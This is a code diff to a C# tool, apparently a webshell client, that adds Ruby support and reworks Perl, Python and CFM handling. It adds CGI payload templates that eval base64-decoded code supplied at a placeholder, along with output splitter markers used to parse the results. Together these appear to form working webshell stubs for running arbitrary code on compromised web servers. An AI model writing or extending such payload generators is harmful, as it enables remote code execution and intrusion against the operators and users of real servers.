@@ -40,7 +40,7 @@ namespace Alien
             { enLanguage.JSPX, "jspx" },
             { enLanguage.Perl, "pl" },
             { enLanguage.Python, "py" },
-
+            { enLanguage.Ruby, "rb" }
         };
 
         private readonly Dictionary<enLanguage, Func<string, Func<string, string, string>>> m_dicWrapper = new()
@@ -66,6 +66,13 @@ namespace Alien
                     "JScript" => fnWrapJScript,
                     "CSharp"  => fnWrapCSharp,
                     _ => throw new NotSupportedException()
+                }
+            },
+            {
+                enLanguage.Perl,
+                type => type switch
+                {
+                    _ => fnWrapPerl,
                 }
             }
         };
@@ -98,6 +105,13 @@ namespace Alien
             },
             {
                 enLanguage.Perl,
+                new string[]
+                {
+                    "", "",
+                }
+            },
+            {
+                enLanguage.Ruby,
                 new string[]
                 {
                     "", "",
@@ -144,7 +158,36 @@ namespace Alien
             {
                 enLanguage.Perl, (type) =>
                 {
-                    return @"use CGI; use MIME::Base64; print(""Content-Type: text/html\r\n\r\n""); eval(MIME::Base64::decode_base64(""[PATTERN]""));";
+                    if (type == "CGI")
+                        return @"use CGI; use MIME::Base64; print(""Content-Type: text/html\r\n\r\n""); eval(MIME::Base64::decode_base64(""[PATTERN]""));";
+
+                    return null;
+                }
+            },
+            {
+                enLanguage.Ruby, (type) =>
+                {
+                    if (type == "CGI")
+                        return @"print ""Content-Type: text/plain\r\n\r\n"";require 'base64';eval(Base64.decode64('[PATTERN]'));";
+
+                    return null;
+                }
+            },
+            {
+                enLanguage.Python, (type) =>
+                {
+                    if (type == "CGI")
+                        return string.Empty;
+
+                    return null;
+                }
+            },
+            {
+                enLanguage.CFM, (type) =>
+                {
+
+
+                    return null;
                 }
             }
         };
@@ -157,7 +200,8 @@ namespace Alien
             { enLanguage.PHP, "echo(\"[SPLITTER]\");" },
             { enLanguage.ASP, "Response.Write(\"[SPLITTER]\")" },
             { enLanguage.ASPX, "Response.Write(\"[SPLITTER]\");" },
-            { enLanguage.Perl, "print \"[SPLITTER]\";" }
+            { enLanguage.Perl, "print \"[SPLITTER]\";" },
+            { enLanguage.Ruby, "print \"[SPLITTER]\";" }
         };
 
         private Dictionary<enLanguage, Func<string, string>> m_dicEncapusulator = new Dictionary<enLanguage, Func<string, string>>()
